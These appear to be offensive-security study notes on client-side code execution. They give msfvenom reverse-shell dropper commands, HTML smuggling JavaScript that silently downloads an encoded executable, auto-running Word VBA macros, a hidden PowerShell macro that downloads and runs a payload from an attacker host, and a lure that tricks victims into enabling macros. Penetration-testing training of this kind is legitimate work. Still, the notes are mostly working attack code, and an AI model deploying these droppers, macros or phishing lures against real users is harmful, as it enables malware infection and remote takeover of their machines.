# Droppers

Droppers are the first stage payload which on executing contact a C2 server for the rest of the payload. Droppers can be effectively used to deliver small sized payloads which can easily bypass Antivirus and their only function is to get on the system and contact the C2 for furthur instructions.

msfvenom can be used to create payloads and the metasploit's multi handler can easily handle both staged and non-staged payloads.

Example payload creation :-

    Non-Staged payload :
    sudo msfvenom -p windows/shell_reverse_tcp LHOST=\<ip> LPORT=\<port> -f exe -o shell.exe

    Staged Payload :
    sudo msfvenom -p windows/shell/reverse_tcp LHOST=\<ip> LPORT=\<port> -f exe -o shell.exe

Non-Staged payloads are much smaller in size, the only difference in command between the two is the forwardslash.

Netcat or msfconsole can be used as a listener.

&nbsp;

# HTML Smuggling

The HTML anchor tag can be used to automatically download a file onto the computer when a hyperlink is clicked.

    <html>
        <body>
            <a href="/msfstaged.exe" download="msfstaged.exe">DownloadMe</a>
        </body>
    </html>

This however requires user interaction and also the filename is seen, the browser will block off such downloads almost instantly.

Javascript can be used to automatically download the file in form of octet stream. The steps are :

1. Store the payload in form of base64
2. Convert the base64 to byte array and store this in a variable
3. Create a Blob of octet stream.
4. Create a URL File object of the blob using the URL.createObjectURL() to stimulate the file being on a webserver.
5. Now create an anchor tag with the display set to none.
6. Set the href of the anchor tag to the URL file object.
7. Give the filename using \<tagname>.download
8. Stimulate a click using the \<tagname>.click

Code :-

    <html>
        <body>
            <script>
                function base64ToArrayBuffer(base64)
                {
                    var binary_string = window.atob(base64);
                    var len = binary_string.length;
                    var bytes = new Uint8Array( len );
                    for (var i = 0; i < len; i++)
                    {
                        bytes[i] = binary_string.charCodeAt(i);
                    }
                    return bytes.buffer;
                }

                var file ='TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAA...
                var data = base64ToArrayBuffer(file);
                var blob = new Blob([data], {type: octet/stream'});
                var fileName = 'msfstaged.exe';

                var a = document.createElement('a');
                document.body.appendChild(a);
                a.style = 'display: none';
                var url = window.URL.createObjectURLblob);
                a.href = url;
                a.download = fileName;
                a.click();
                window.URL.revokeObjectURL(url);
            </script>
        </body>
    </html>

&nbsp;

# Phising with Microsoft Office

## Basic Macro Payloads

Macros in Word can be added by navigating to Macros option in the View Tab. Now select the current document from the drop down and give the Macro a name and then add it. The macro will be written in VBA (Visual Basic for Applications) Script.

![VBA Editor in Word](/OSEP/Client-Side-Code-Execution-With-Office/images/vba-editor.png)

&nbsp;

### Simple If-Else function in Macros

    Sub MyMacro()
        Dim myLong As Long
        myLong = 1
        If myLong < 5 Then
            MsgBox ("True")
        Else
            MsgBox ("False")
        End If
    End Sub

&nbsp;

### For-loop function in Macros

    Sub MyMacro()
        For counter = 1 To 3
            MsgBox ("Alert")
            Next counter
    End Sub

Note : The Word file should be saved in the legacy .doc extension. Extensions of .docx or .docm block macros from executing.

&nbsp;

## Security Settings of Microsoft Word

Navigate to _File > Options > Trust Center > Trust Center Settings_

The default settings of the Trust Center for macros is "Disable all macros with notification"

![Trust Center default](/images/trust-center-default.png)

The Protected View has the following things by default

![Protected View](/images/trust-center-protected.png)

## Opening cmd.exe from Macros

There are two methods :

1. Shell function of VBA

   - Initialize a string
   - Set the value of the string to cmd.exe
   - Use the Shell function with the vbHide, which sets the window style to (0), hence hides the shell.
   - Code :

   ```
        Sub Document_Open()
            MyMacro
        End Sub

        Sub AutoOpen()
            MyMacro
        End Sub

        Sub MyMacro()
            Dim str As String
            str = "cmd.exe"
            Shell str, vbHide
        End Sub
   ```

2. CreateObject method of the Windows Script Host (WSH)

   - Initialize a string
   - Set the value of the string to cmd.exe
   - Use the WScript.shell to pop a command prompt and set the window style to 0 to hide it.
   - Code :

   ```
        Sub Document_Open()
            MyMacro
        End Sub

        Sub AutoOpen()
            MyMacro
        End Sub

        Sub MyMacro()
            Dim str As String
            str = "cmd.exe"
            CreateObject("Wscript.Shell").Run str, 0
        End Sub
   ```

## Powershell with Macros

Code:

    Sub Document_Open()
        MyMacro
    End Sub

    Sub AutoOpen()
        MyMacro
    End Sub

    Sub MyMacro()
        Dim str As String
        str = "powershell (New-Object
        System.Net.WebClient).DownloadFile('http://<ip>/msfstaged.exe','msfstaged.exe')"
        Shell str, vbHide
        Dim exePath As String
        exePath = ActiveDocument.Path + "\msfstaged.exe"
        Wait (2)
        Shell exePath, vbHide
    End Sub

    Sub Wait(n As Long)
        Dim t As Date
        t = Now
        Do
            DoEvents
        Loop Until Now >= DateAdd("s", n, t)
    End Sub

&nbsp;

Explanation:

1. We first write the macro functions to auto execute macro on opening the word file. (Document_Open and AutoOpen functions)
2. We initialize a variable called "str" with the string datatype
3. A powershell payload to download a dropper is assigned to the variable.
4. The variable "str" is executed in the shell with the Shell function of VBA and the windows style is set to 0 using vbHide to hide the process from the user.
5. The path of the downloaded file is then fetched using ActiveDocument.Path and the file name is concatenated to this.
6. The complete path of the downloaded file is stored in a variable.
7. The variable is executed in the shell with the Shell function of VBA and the windows style is set to 0 using vbHide to hide the process from the user.
8. The Wait() function acts as a sleep command, it takes the number of seconds as it's argument. It then fetches the current time and adds the inputted wait time. It then waits for the current time to be greater than the previous calculated sum. This acts as a sleep function in VBA.

## Phising user into disabling Protected View and Enabling Macros

- A Simple technique can be used where we put some random encrypted junk as the word content.
- Then the user has to enable the macros, which replaces the encrypted text into the proper expected content.
- This tricks the user into thinking they have decrypted the text, while in fact they have enabled macros and disabled the protected view.
- An autotext template can be added by navigating to the _Insert > Quick Parts > AutoTexts_
- Create an autotext and save it to the gallery.
- Now we will use the macros to replace the contents of the document with the one stored in AutoText gallery.
- Code:

```
    Sub Document_Open()
        SubstitutePage
    End Sub

    Sub AutoOpen()
        SubstitutePage
    End Sub

    Sub SubstitutePage()
        ActiveDocument.Content.Select
        Selection.Delete
        ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert
        Where:=Selection.Range, RichText:=True
    End Sub
```
